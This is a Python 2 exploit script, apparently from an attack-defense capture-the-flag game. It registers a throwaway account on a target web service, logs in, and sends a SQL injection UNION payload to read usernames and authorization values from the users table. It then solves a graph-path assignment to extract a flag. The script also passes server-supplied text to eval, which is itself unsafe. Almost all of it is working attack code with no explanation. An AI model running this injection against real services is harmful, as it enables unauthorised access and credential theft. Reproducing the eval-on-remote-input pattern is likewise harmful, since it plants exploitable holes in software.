import sys

class Exploit():

    def post(self,path,p={}):
        import urllib,urllib2
        from cookielib import CookieJar

        
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cj))

        params = urllib.urlencode(p)
        f = opener.open("http://%s:%d%s"%(self.ip,self.port,path), params)
        return f.read()

    def get(self,path):
        import urllib,urllib2
        from cookielib import CookieJar
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cj))
        print "http://%s:%d%s"%(self.ip,self.port,path)
        f = opener.open("http://%s:%d%s"%(self.ip,self.port,path))
        return f.read()


    def net(self,raw):
        import networkx as nx
        lines=raw.split("\n")
        print repr(lines)
        nodes = eval(lines[0])
        edges = eval(lines[1])
        start = int(lines[2].strip())
        end = int(lines[3].strip())
        graph = nx.Graph()
        graph.add_nodes_from(nodes)
        graph.add_edges_from(edges)
        shortest_paths = nx.all_shortest_paths(graph, source=start, target=end)
        s=[]
        for p in shortest_paths:
            s.append(str(p))
        return ','.join(s)

    def execute(self, ip, port, flag_id):
        import random,string,re,urllib
        from cookielib import CookieJar
        import networkx as nx

        self.ip=ip
        self.port=port      
        self.username=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
        self.password=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
        self.cj = CookieJar()
        reg=self.post("/register",{"username":self.username,"password":self.password,"authorization":"xxx"})  
        login=self.post("/login",{"username":self.username,"password":self.password,"submit":"Login"}) 
        try:
            self.get(urllib.pathname2url("/b9c659d857ada50208cb569a1929622b%' UNION select username, authorization from users --"))
        except:
            pass
        ass_match=re.search("(assignment_([a-z0-9]+)\.ass)",login)
        ass=ass_match.group(0)
        ret=self.net(self.get("/"+ass))
        sol=self.post("/solution",{"solution":ret,"assignment":ass_match.group(1),"submit":"Submit"})
        #print sol
        self.flag = re.findall("(FLG[a-zA-Z0-9]+)",sol)[0]


    def result(self):
        return {'FLAG' : self.flag }

e=Exploit()
#e.execute("10.105.0.54",8888,"")
e.execute("10.13.37.49",8888,"")

#10.13.37.49
print e.result()